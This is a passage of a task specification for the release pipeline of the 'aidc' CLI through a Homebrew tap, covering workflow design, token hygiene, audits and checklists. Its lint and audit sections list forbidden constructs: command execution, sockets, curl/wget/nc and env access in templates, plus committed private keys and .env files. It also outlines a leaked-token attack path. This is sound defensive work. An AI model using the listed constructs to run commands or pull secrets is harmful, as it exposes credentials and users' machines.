.github/CODEOWNERS                        @pacepace/aidc-maintainers
docs/tasks/task-14*                       @pacepace/aidc-maintainers
docs/requirements.md                      @pacepace/aidc-maintainers
```

GitHub uses this with branch protection's "Require review from Code Owners" setting AND "Dismiss stale pull request approvals when new commits are pushed" — both MUST be enabled. Without the latter, an approved PR can be amended after approval and ship un-reviewed changes. Both are repo-admin actions (called out in the Action Items section).

If `pacepace/aidc-maintainers` does not yet exist as a GitHub team when this task implements: the implementing subagent should still use the team-of-one syntax in the CODEOWNERS file. Pace creates the team (one member: himself) as part of the v0.1.0 launch action items.

### `release/lint-formula-template.sh`

New file. Greps `release/Formula/*.tmpl` files for forbidden Ruby execution constructs. Run by `make lint` and by the lint workflow (task-12 hooks this in via `make lint`).

The forbidden-construct grep (single egrep, multiple patterns):
- **Execution:** `system\s*\(`, `exec\s*\(`, `eval\b`, `instance_eval`, `class_eval`, `define_method`
- **Subprocess:** `IO\.popen`, `Open3\.`, `Process\.`, `Kernel\.send`, `__send__`, `Kernel\.spawn`
- **Backticks:** ``` ` ``` not inside `# comments`, plus `%x\{` (alternate backtick syntax: `%x{cmd}` ≡ `` `cmd` ``)
- **`open`-with-pipe:** `open\s*\(` (Ruby's `open` executes commands when given `"|cmd"`), `URI\.open`
- **Filesystem:** `File\.`, `Pathname`, `Dir\.glob\s*\([^"']` (non-literal arg only — literals OK)
- **Network/crypto:** `Net::HTTP`, `Net::FTP`, `socket`, `TCPSocket`, `UDPSocket`, `OpenSSL::`
- **Require with dynamic arg:** `require_relative` with non-literal arg, `require` with non-literal arg
- **Ternary with method-call right-hand side:** `?[a-zA-Z_]+\.[a-zA-Z_]+\s*:` (easy place to sneak in `?evil.method:` constructs)
- **Shell-style placeholder accidents:** `\$\{[^}]*\}` patterns — we use `__VAR__`, NOT shell-style
- **Env / process introspection:** `ENV\[`, `ENV\.fetch`, `__FILE__`, `__dir__` (env values may include secrets; path disclosure aids chain construction)
- **Cross-formula references:** `Formula\[`, `Tap\.` (a malicious template could pull in another formula's `install` block; CODEOWNERS catches the PR but lint catches the construct directly)
- **Metaprogramming sideband:** `\bprepend\b`, `\bextend\b`, `singleton_class`, `Module#`, `Class#` (we already ban `class_eval`/`instance_eval`/`define_method`; these are the other meta-handles that achieve equivalent effect)

Allowlist (the ONLY constructs permitted outside comments and string literals):
- Class declaration, method definitions, `keg_only`, `depends_on`
- The fixed allowlist of formula DSL methods listed earlier in this file
- Documented `__VAR__` placeholders
- HOMEBREW_PREFIX string interpolation in heredocs

Anything else fails lint with file:line:matched-pattern output.

The script:
- Iterates each `release/Formula/*.tmpl`.
- For each, strips `#` comment lines from consideration.
- Runs the egrep; ANY hit fails the script (exit 1) with a clear message naming the offending file, line, and matched pattern.
- Allowlist mode: if a future template legitimately needs a construct currently forbidden, the diff for the allowlist change goes through the same CODEOWNERS path and gets Pace's review.

This script is part of `make lint`. CI's lint job (task-12) runs `make lint`, so this lint runs on every PR.

### `release/tarball-audit.sh`

Audits the **git tree** (not the tarball — see `tarball-audit-extracted.sh` for that). Run by the release workflow as a pre-release gate.

The script greps `git ls-tree -r HEAD --name-only` for:
- `tests/scratch/*` (smoke harness scratch — never should be committed)
- `*/audit/*` (per-session audit dirs — never should be committed)
- `.env`, `*.env`, `.envrc` (env files often contain credentials)
- `*.pem`, `*.key` (private keys)
- `id_rsa*`, `id_ed25519*` (SSH private keys)
- `*.p12`, `*.pfx` (certificate stores)

Any match fails the script (exit 1) with a clear message naming the offending file. The script MUST run on the tagged commit's contents (`git ls-tree -r HEAD --name-only` after `actions/checkout` of the tag), not the workflow's branch HEAD.

### `release/tarball-audit-extracted.sh`

Audits the **extracted tarball contents** (defends against `.gitattributes export-subst` / `export-ignore` divergence from the tree). Run by the release workflow as a pre-release gate AFTER the tarball is downloaded.

Usage:
```bash
release/tarball-audit-extracted.sh <path-to-downloaded-tarball.tar.gz>
```

First line of the script asserts GNU tar:
```bash
if ! tar --version 2>/dev/null | head -n1 | grep -q 'GNU tar'; then
    echo "::error::release/tarball-audit-extracted.sh requires GNU tar (the workflow runs on ubuntu-latest); refusing to run under a different tar implementation"
    exit 2
fi
```
This catches a future migration to a runner with BSD tar (macOS self-hosted) silently mis-auditing — BSD tar's `tzf` output formatting differs on symlinks. The release workflow MUST run on ubuntu-latest as currently specified; this assertion fails loudly if someone changes that without updating this script.

The script then runs `tar tzf "$1"` (no extraction — just list contents) and greps the path list for the same forbidden patterns as `tarball-audit.sh`. Same exit semantics: any match fails the script with a clear message.

Both audits MUST pass for the release to proceed.

### `docs/release-process.md`

A short doc (2-3 pages) covering:

**Main-line release (most common):**
- Bump `VERSION` from `v0.1.0-dev` to `v0.1.0`, commit "release prep: v0.1.0", push to main, wait for CI to pass.
- Tag the release commit: `git tag v0.1.0 && git push origin v0.1.0`. The release workflow takes it from there.
- Verify the workflow ran (`gh run watch`), produced a GitHub Release, and updated BOTH `Formula/aidc.rb` AND `Formula/aidc@0.1.rb` in the tap.
- Post-release prep: bump `VERSION` to `v0.1.1-dev` (or `v0.2.0-dev`), commit, push.

**Hotfix from a release branch (less common, but critical to document):**
- `git checkout -b release/v0.1 v0.1.0` (or check out the prior release branch if it exists)
- Apply the fix; verify smoke; bump VERSION to `v0.1.1`.
- Commit, push the branch.
- Tag: `git tag v0.1.1 && git push origin v0.1.1`.
- The release workflow triggers off the tag regardless of branch; it produces a v0.1.1 release + updates the tap's `aidc@0.1.rb` formula (and `aidc.rb` if v0.1.1 is still the latest line).
- IMPORTANT: if main is on v0.2.x-dev and you tag v0.1.1, do NOT update the unversioned `Formula/aidc.rb` to v0.1.1 — that would downgrade users on v0.2.x. The release workflow MUST detect this and skip the unversioned formula update when the tag's major.minor is lower than the unversioned formula's current version. Document the manual override (run the update with `SKIP_UNVERSIONED=1`) for cases where this auto-detection is wrong.
- Cherry-pick the fix to main (or merge if appropriate).

**Botched release recovery:**
- Delete the tag both locally (`git tag -d`) and on remote (`git push origin :refs/tags/v0.1.0`).
- Delete the GitHub Release via `gh release delete v0.1.0`.
- Manually delete the bad formula commits from the tap repo with a `git revert` (NOT a force-push — preserve the history of the mistake for forensics).
- Fix, re-tag, re-push.

**Verify after a release:**
- `brew untap pacepace/aidc 2>/dev/null; brew tap pacepace/aidc` (re-tap to pick up the new formula).
- `brew install aidc`.
- `aidc help | head -1` should show `aidc vX.Y.Z`.
- `aidc create test-brew --repo /tmp/aidc-brew-test` (first time will build images, takes 10-15 min).
- Verify `docker image ls aidc/` shows `vX.Y.Z` tags (per task-13).
- `aidc kill test-brew`.

**`TAP_REPO_TOKEN` hygiene:**
- Maximum expiry: **90 days**. Calendar a reminder to rotate at day 75 (gives time to discover and replace before expiry).
- Token name in secrets: `TAP_REPO_TOKEN_EXPIRES_YYYY_MM_DD` (e.g. `TAP_REPO_TOKEN_EXPIRES_2026_08_22`). Visible expiry in the name; impossible to forget what's about to lapse.
- Scope: GitHub fine-scoped PAT with `Contents: Read & Write` on `pacepace/homebrew-aidc` ONLY. No other repos. No other scopes. No "all repos." If the configured scope is wider than this, regenerate.
- Rotation procedure (documented in this doc):
  1. Generate new PAT with target expiry.
  2. Add to repo secrets as `TAP_REPO_TOKEN_EXPIRES_YYYY_MM_DD` (the new date).
  3. Update `.github/workflows/release.yml` to reference the new secret name.
  4. Commit the workflow change.
  5. Trigger a no-op release (e.g. `gh workflow run release.yml`) on a tag to verify.
  6. Revoke the old PAT.
  7. Delete the old secret.
- If a token is ever suspected to be leaked, follow the rotation procedure immediately, then audit the tap repo's commit log for unexpected commits.

**Detecting unauthorized tap commits:**

The release workflow uses `TAP_REPO_TOKEN_EXPIRES_*` which is a fine-scoped PAT owned by Pace's account. Commits made via this PAT show Pace's identity as the committer — NOT `github-actions[bot]`. The cron filter has to recognize this.

The correct filter (run as a daily cron in the tap repo, separate workflow):

```bash
# Allowed pattern: committer is pacepace AND commit message starts with "aidc v"
# (the release workflow's standard message format).
gh api "repos/pacepace/homebrew-aidc/commits?since=$(date -u -d '24 hours ago' +%FT%TZ)" \
    --jq '.[] | select(
        .committer.login != "pacepace" or
        (.commit.message | startswith("aidc v") | not)
    )'
```

Any commit returned by this query is suspicious — either the committer is wrong (token leak; someone other than Pace pushed) or the commit message format is wrong (manual fix? unexpected workflow change?). Both warrant alerting.

If/when the release workflow moves to a dedicated bot account or a GitHub App, update the cron filter accordingly. As long as it uses a personal PAT, the filter has to match the personal login.

Output destination: GitHub Actions step summary on failure, plus a webhook to wherever Pace wants alerts (or a Saoirse MCP notification). The cron workflow itself lives in the tap repo, not here.

**Quarterly branch-protection audit:**

The cron also runs a quarterly assertion that the tap repo's branch protection is still in the expected state. Failure of this assertion is a release-process drift indicator — somebody disabled protection.

Schedule: `0 9 1 */3 *` (9am UTC on the 1st of every third month — Jan, Apr, Jul, Oct).

```bash
# Quarterly: assert protection is still enforced.
# `gh api` returns `null` (not `false`) when a field is unset, so the
# // false coalesce normalizes both "unset" and "disabled" to "false".
gh api repos/pacepace/homebrew-aidc/branches/main/protection --jq '
    "linear_history=\(.required_linear_history.enabled // false),
     enforce_admins=\(.enforce_admins.enabled // false),
     restrict_pushes=\(.restrictions != null)"
'
# Expected output: linear_history=true, enforce_admins=true, restrict_pushes=true
```

If any field is `false` (including via the null→false coalesce above), alert. Same destination as the daily commit-author cron.

**Workflow message-format lint** (in this repo's `make lint`):

The cron filter assumes release commits begin with `aidc v`. To make this contractual rather than aspirational, `make lint` greps `.github/workflows/release.yml` and asserts the commit-message construction line matches the expected format. Specifically, the lint asserts the workflow's commit-message template starts with the literal string `"aidc "` followed by `${GITHUB_REF_NAME}`. Drift in either direction (workflow change, cron filter change) is caught.

### `release/README.md`

A one-paragraph orientation for anyone wandering into the `release/` dir, explaining that the templates here are rendered by the release workflow and not used directly. Prevents the "what is this Ruby file doing here" confusion six months from now.

---

## Files to Modify

### `scripts/cmd-help.sh`

The `aidc help` output is produced by `scripts/cmd-help.sh`, NOT by an inline heredoc in `scripts/aidc`. The dispatcher does `exec "$AIDC_SCRIPTS/cmd-help.sh"` (see `scripts/aidc:30,38`). Edit cmd-help.sh — not the dispatcher.

The current banner in `cmd-help.sh:14-21`:

```bash
cat <<'EOF'
aidc - AI Dev Container CLI

Usage:
  aidc <subcommand> [args...]

Subcommands:
EOF
```

Change the first heredoc to print the version on the first line:

```bash
printf 'aidc %s - AI Dev Container CLI\n\n' "${AIDC_VERSION}"
cat <<'EOF'
Usage:
  aidc <subcommand> [args...]

Subcommands:
EOF
```

Note `${AIDC_VERSION}` is set by the dispatcher (task-13) before exec'ing cmd-help.sh, so it's already in env. No re-read of VERSION here.

The brew `test do` block asserts on this output, so the change is required for `brew test aidc` to pass.

### `scripts/aidc`

No edit needed in this file as part of task-14. Task-13 already added the VERSION read + export. Cross-check: `scripts/aidc` exports `AIDC_VERSION` before the `exec "$SUBCOMMAND_SCRIPT"` line. If it does, leave alone.

### `Makefile`

No release-related target is added in this task. The release process is:

1. Edit `VERSION` by hand.
2. Commit + push.
3. `git tag vX.Y.Z && git push origin vX.Y.Z`.
4. The CI workflow does the rest.

`docs/release-process.md` is the operator-facing checklist. No `release-prep.sh` automation script — the doc is the release-prep mechanism. An under-tested automation script causes more late-night incidents than it prevents; the manual checklist is the chosen approach, not a placeholder for automation.

### `README.md`

Add a brief "Install" section update mentioning the brew tap as the recommended path for non-dev users:

```markdown
## Install

### Recommended (macOS / Linux):

    brew tap pacepace/aidc
    brew install aidc

Requires Docker; install separately from Docker Desktop (macOS) or your distro's package manager. Verify with `docker info`.

### From source (devs):

    git clone https://github.com/pacepace/aidc
    cd ai-devcontainer
    make install   # symlinks scripts/aidc to ~/.local/bin/aidc
```

Keep this short; the existing README is already detailed.

---

## Implementation Notes

1. **Three jobs, single workflow.** Don't split release into multiple workflows. Single workflow with `needs:` chains is easier to reason about. If smoke fails, the release+tap jobs don't run. Top-level `permissions: {}`; per-job grants only.

2. **The tag commit and the tarball.** GitHub generates the source tarball at `https://github.com/pacepace/aidc/archive/refs/tags/${TAG}.tar.gz`. It exists from the moment the tag is pushed. The release workflow downloads it via `curl -fsSL` (NOT via `actions/checkout`) so the sha256 matches what brew will see on user machines. Before downloading, verify the tag points at the just-built commit (see release.yml prescription above) to defend against a between-trigger-and-download re-tag.

3. **The sha256 ordering pitfall.** Some release templates compute sha256 from a *local* tarball generated by the workflow. That doesn't match GitHub's auto-generated tarball byte-for-byte (different gzip parameters, different file ordering, different timestamps). Brew users would download a tarball that doesn't match the formula's sha256 → install fails. ALWAYS download the published tarball URL and compute sha256 from THAT.

4. **Tag-VERSION sync check.** Add a job step that asserts:
   ```bash
   GIT_TAG="${GITHUB_REF_NAME}"    # e.g. v0.1.0
   FILE_VER=$(cat VERSION | tr -d '[:space:]')
   if [ "$GIT_TAG" != "$FILE_VER" ]; then
       echo "::error::tag $GIT_TAG != VERSION file $FILE_VER"
       exit 1
   fi
   ```
   Catches forgot-to-bump-VERSION-before-tagging mistakes.

5. **Tap commit message.** Use `aidc ${VERSION}` (e.g. `aidc v0.1.0`) so the tap repo's history is a clean changelog by itself. Include the workflow run URL in the commit body for traceability.

6. **The brew formula's `test do` block.** It runs in CI when the formula is audited (e.g. via `brew audit --strict aidc`). The audit will not run automatically on a custom tap, but `brew install --build-from-source --interactive aidc` exercises it manually. Test should be cheap and never hit the network.

7. **DO NOT** install via brew on the GH runner to verify. The runner doesn't have Docker Desktop. Verification of a brew install requires Pace running `brew install aidc` on his own Mac after the release lands. Document this in `docs/release-process.md`.

8. **First release pre-flight.** The first time this workflow runs successfully, Pace needs to:
   - Run `brew tap pacepace/aidc` on his Mac.
   - Run `brew install aidc`. Verify `which aidc` points to `/opt/homebrew/bin/aidc`.
   - Run `aidc help`; first line should show `aidc v0.1.0`.
   - Run `aidc create test-brew --repo /tmp/aidc-brew-test` (first time will build images, takes 10-15 min).
   - Confirm everything works end-to-end.
   - Then `aidc kill test-brew`. Document this as a release smoke check.

9. **Concurrency for releases is `cancel-in-progress: false`.** Unlike PR smoke (where cancelling old runs is desirable), a release in flight that gets cancelled may have already pushed to the GitHub Release but not yet updated the tap formula. That leaves the world in an inconsistent state (a user sees a release exists but `brew install aidc` still pulls the old version). Queue instead.

10. **TAP_REPO_TOKEN is the highest-blast-radius secret in the project.** If it leaks, an attacker can ship a malicious `Formula/aidc.rb` with a `url` pointing at attacker infra and a matching `sha256`; every `brew upgrade aidc` then pulls and runs attacker code as the user. Treat it accordingly: 90-day max expiry, date-encoded secret name, scope confined to one repo, daily monitoring of tap-repo commits, documented and tested rotation procedure.

11. **`set -x` is BANNED in release workflow steps.** Same rule as task-12 but reinforced here because the release workflow has secrets in scope. Any future step that prints raw env, dumps rendered files, or enables trace mode could leak `TAP_REPO_TOKEN` into a public GitHub Actions log.

12. **The brew `test do` block runs unprivileged on EVERY user's machine.** Anything `aidc help` does — including lib files sourced by the dispatcher — runs there. Keep lib files side-effect-free (no network calls, no file writes outside `$HOME`, no sudo). If a future change adds a side effect to `aidc help`, the test must move to a more restricted invocation (e.g. `aidc --version` if added later).

---

## Anti-patterns

- **DO NOT** publish images to Docker Hub, ghcr.io, or any other registry as part of this task. REL-08 is explicit: never publish images. The user's machine builds.
- **DO NOT** create the tap repo from the workflow. Create it manually (one-time step). Workflows that auto-create repos require admin-scoped tokens — too much blast radius.
- **DO NOT** open a PR to the tap repo. Direct commit. The tap is single-purpose; PR ceremony is dead weight.
- **DO NOT** sign the tarball, sign commits, or add release notes generation to this task. Each is its own follow-up. Scope creep here turns a 4-hour task into a 2-week task.
- **DO NOT** use brew's `livecheck` block. It's for projects that publish to a registry brew can poll; aidc doesn't, and a livecheck would just produce errors.
- **DO NOT** add automated formula audits (`brew audit --strict`) as a release gate. Audits require Apple's homebrew-core upstream setup; for a personal tap they produce false positives. Manual `brew audit` is fine; automated is overhead.
- **DO NOT** depend on the smoke job's cache in the release workflow. The release job runs once per tag; cache savings don't outweigh the complexity. Cold builds are fine for releases.
- **DO NOT** include `tests/scratch/`, `.git/`, `*.bak`, or any other transient files in the release tarball. GitHub's auto-tarball already excludes `.git/`; the `release/tarball-audit.sh` step enforces the rest.
- **DO NOT** pin third-party actions by tag (`@v3`, `@main`, `@latest`). Pin by full 40-char commit SHA. Same security rule as task-12; the release workflow has higher blast radius (`contents: write` + `TAP_REPO_TOKEN`), so the rule matters MORE here, not less.
- **DO NOT** use `pull_request_target` as a trigger anywhere in the release workflow.
- **DO NOT** use `secrets.GITHUB_TOKEN` for the cross-repo push to the tap. That token is scoped to THIS repo and cannot write the tap repo even if it tried. Use the fine-scoped TAP_REPO_TOKEN secret described above.
- **DO NOT** store the TAP token with `Contents: Read & Write` on "all repositories" or with any scope beyond `Contents: Read & Write` on `pacepace/homebrew-aidc`. If a wider scope is configured, regenerate.
- **DO NOT** rely on documentation alone for token rotation. The token name in repo secrets MUST encode its expiry date (`TAP_REPO_TOKEN_EXPIRES_YYYY_MM_DD`) so the next person to look at the secret screen immediately sees what's about to lapse.
- **DO NOT** allow `set -x`, `env`, `printenv`, `set | grep`, or unredacted `cat` of secrets-adjacent files in any workflow step. Same anti-pattern as task-12; matters more here because TAP_REPO_TOKEN is in scope.
- **DO NOT** add side-effects to lib files sourced by `aidc help` (like network calls, file writes outside `$HOME`, sudo prompts). The brew `test do` block runs `aidc help` unprivileged on every user install — anything `aidc help` does, every brewer-install runs. Keep it pure.
- **DO NOT** auto-overwrite `Formula/aidc.rb` (the unversioned formula) when releasing a hotfix to an older line. If main is on v0.2.x and you tag v0.1.1, the unversioned formula MUST stay at v0.2.x — only the `aidc@0.1.rb` versioned formula gets updated. The release workflow detects this; do NOT remove that check to "simplify."
- **DO NOT** push to the tap with `--force`. The tap's git history is the audit trail for what users installed. Force-push erases that.
- **DO NOT** allow personal-account pushes to the tap's `main` branch. All tap changes go through the release workflow. Manual recovery from a botched release is done by `git revert` in the tap repo, NOT by a force-push or a direct edit. (Branch protection enforces this; see Action Items.)

---

## Success Criteria

- [ ] `pacepace/homebrew-aidc` repo exists, public, with `README.md` and the `Formula/` dir.
- [ ] `release/Formula/aidc.rb.tmpl` exists in this repo.
- [ ] `.github/workflows/release.yml` exists with smoke + release + update-tap jobs.
- [ ] `TAP_REPO_TOKEN` is configured in this repo's Actions secrets.
- [ ] `docs/release-process.md` exists with the human-facing release walkthrough.
- [ ] `README.md` mentions the brew tap install path.
- [ ] `scripts/aidc` prints the version in the help banner.
- [ ] `docs/release-process.md` covers main-line release, hotfix from release branch, botched-release recovery, post-release verify, TAP_REPO_TOKEN rotation, and unauthorized-tap-commit detection. (No `Makefile` `release-prep` target in this task; the doc is the operator checklist.)
- [ ] Tagging `v0.1.0` (after VERSION is bumped) produces a GitHub Release with the source tarball attached.
- [ ] The release workflow commits a new `Formula/aidc.rb` to the tap repo with the correct version and sha256.
- [ ] On a clean Mac, `brew tap pacepace/aidc && brew install aidc && aidc help` works end-to-end and shows the new version.
- [ ] On the same Mac, `aidc create brew-smoke --repo /tmp/x` creates a session that's functionally identical to a `make install`-based session.
- [ ] The first release tarball does NOT contain `tests/scratch/`, `.git/`, `.DS_Store`, `.env*`, `*.pem`, `*.key`, `id_rsa*`, or any other gunk. Verify by `tar tzf` of the downloaded tarball; `release/tarball-audit.sh` also enforces this at release time.
- [ ] Every `uses: org/action@<ref>` line in `.github/workflows/release.yml` references a 40-character commit SHA with a `# vMAJOR.MINOR.PATCH` comment alongside.
- [ ] Top-level `permissions:` block in `release.yml` is `{}`. Per-job grants are `contents: read` (smoke), `contents: write` (release), `contents: read` (update-tap).
- [ ] The release workflow renders BOTH `Formula/aidc.rb` AND `Formula/aidc@MAJOR.MINOR.rb` on every release.
- [ ] The versioned formula uses `keg_only :versioned_formula` so it doesn't conflict with the unversioned formula's `bin/aidc` symlink.
- [ ] On a hotfix tag (e.g. v0.1.1 while main is at v0.2.x-dev), the unversioned `Formula/aidc.rb` is NOT updated; only the versioned `aidc@0.1.rb` is.
- [ ] The release workflow verifies the just-pushed tag points at the just-built commit before downloading the tarball.
- [ ] BOTH `release/tarball-audit.sh` (git-tree audit) AND `release/tarball-audit-extracted.sh` (downloaded-tarball-contents audit) run as pre-release gates. The release workflow MUST run BOTH and fail on any match in EITHER.
- [ ] `docs/release-process.md` documents: main-line release, hotfix from release branch, botched-release recovery, post-release verify, TAP_REPO_TOKEN rotation (90-day max), and unauthorized-tap-commit detection.
- [ ] `TAP_REPO_TOKEN_EXPIRES_YYYY_MM_DD` is the secret name (with the actual expiry date), not a generic `TAP_REPO_TOKEN`.
- [ ] No workflow step uses `set -x`, `env`, `printenv`, or unredacted `cat` of files that may contain secrets.
- [ ] The unversioned formula's `caveats` includes the upgrade-rebuild notice ("After upgrading, the next `aidc create` rebuilds container images") and the pin-a-major.minor hint.
- [ ] `libexec.install Dir["*"].reject { |f| f == "tests" }` (or equivalent) — the install excludes the `tests/` dir.
- [ ] **`make lint` enforces lib-file purity:** any `scripts/lib/*.sh` file (sourced by `aidc help` via the dispatcher chain) containing a top-level side-effect — `curl`, `wget`, `nc`, `>file`, `rm `, `mkdir `, `chmod `, `chown `, `sudo`, network-touching builtins — fails lint. Cheap regex check; catches the case where someone adds an init-time side effect that then runs on every brew install via the `test do` block.
- [ ] **`make lint` enforces no SHA-pin bypass:** the workflow yaml lint rules from task-12 also cover `.github/workflows/release.yml` — same regex.
- [ ] **The `workflow_dispatch` dry-run path is verified:** `gh workflow run release.yml -f tag=v0.1.0-dev` (or any in-progress tag) runs end-to-end without creating a GitHub Release or pushing to the tap (`workflow_dispatch` is dry-run-ONLY by construction — `github.event_name == 'push'` guards the side-effect steps; there is no `dry_run` input). Documented in `docs/release-process.md` as the token-rotation verification path.
- [ ] **The unauthorized-tap-commit cron alert filter matches the actual identity used.** `TAP_REPO_TOKEN_EXPIRES_*` commits show Pace's login (not `github-actions[bot]`). The cron filter is `committer.login != "pacepace" OR commit.message NOT starting with "aidc v"`.
- [ ] **Tap branch protection** on `pacepace/homebrew-aidc:main`: require linear history; restrict pushes to the PAT identity only; administrators cannot bypass.
- [ ] **The skip-unversioned-on-older-line logic is verifiable:** a dry-run with a synthesized `v0.0.1` tag (lower than any released line) does NOT update `Formula/aidc.rb`; it ONLY writes/updates `Formula/aidc@0.0.rb`.
- [ ] **The post-download tag→commit re-verification step fires.** Manual test: tag-and-push a release, then immediately re-tag the same name to a different commit via `git tag -f` (in a throwaway repo or via `gh api`); the workflow MUST detect and abort.

---

## Verification

```bash
# Pre-release: validate VERSION file before tagging
cat VERSION
# v0.1.0   <-- not v0.1.0-dev; the operator bumped it as part of release prep

# Pre-tag: confirm smoke is green on the release-prep commit
gh run list --branch main --workflow smoke.yml --limit 1

# Tag and push
git tag v0.1.0
git push origin v0.1.0

# Watch the release workflow
gh run watch

# Verify GitHub Release was created
gh release view v0.1.0

# Verify tap repo was updated
gh api repos/pacepace/homebrew-aidc/contents/Formula/aidc.rb \
    --jq '.content' | base64 -d | grep -E '^  (url|sha256|version)'

# On a fresh-ish Mac (or after `brew untap pacepace/aidc`):
brew tap pacepace/aidc
brew install aidc
which aidc
aidc help | head -1     # expects: "aidc v0.1.0 - AI Dev Container CLI"

# Live test
aidc create brew-test --repo "$(pwd)"
# (first time: 10-15 min build; subsequent: ~30s)
aidc kill brew-test

# Post-release: bump VERSION to next dev cycle
echo 'v0.1.1-dev' > VERSION
git add VERSION
git commit -m 'post-release: bump VERSION to v0.1.1-dev'
git push
```

---

## Enforcement Test Suggestions

- [ ] VERSION file format enforced. Already suggested in task-13; reinforce here because the release flow assumes it.
- [ ] The release workflow's `update-tap` job uses `TAP_REPO_TOKEN_EXPIRES_*`, not `GITHUB_TOKEN`. Suggested test: grep the workflow yaml for `secrets.GITHUB_TOKEN` inside the `update-tap` job; if found, fail. Prevents accidental scope-escalation.
- [ ] Both brew formula templates render to valid Ruby. Suggested test: render each template with a known version and sha256, parse the resulting Ruby with `ruby -c`, assert no syntax errors. Cheap, catches "I broke the template by adding a stray placeholder" mistakes.
- [ ] Release tarball excludes the right things. Suggested test: after each release, the post-release workflow runs `gh release download v$VERSION` + `tar tzf` and asserts none of `tests/scratch`, `.DS_Store`, `__pycache__`, `.env*`, `*.pem`, `*.key`, `id_rsa*` appear. Catches GitHub-side changes in tarball generation AND any developer who slips an `.env` into a commit.
- [ ] All third-party actions in `release.yml` are SHA-pinned. Same grep-based check as task-12; arguably should be enforced in both. Cross-link the test.
- [ ] The unversioned formula is NOT updated on a hotfix-to-older-line tag. Suggested test: simulate `v0.1.1` while VERSION on main is `v0.2.x`; assert the update-tap job leaves `Formula/aidc.rb` unchanged and only writes `Formula/aidc@0.1.rb`.
- [ ] No workflow step contains `set -x`, `env`, `printenv`, or other leak vectors. Same regex as task-12.
- [ ] Tap repo's daily commit-author audit is configured. Hard to enforce from THIS repo's CI; document in `release-process.md` as a manual verify at release time (look at the tap repo's Actions tab for green cron runs).
- [ ] `TAP_REPO_TOKEN_EXPIRES_*` secret name matches the actual PAT expiry. Hard to enforce automatically (GitHub doesn't expose secret values or expiry to Actions); document as a manual check during the rotation procedure.
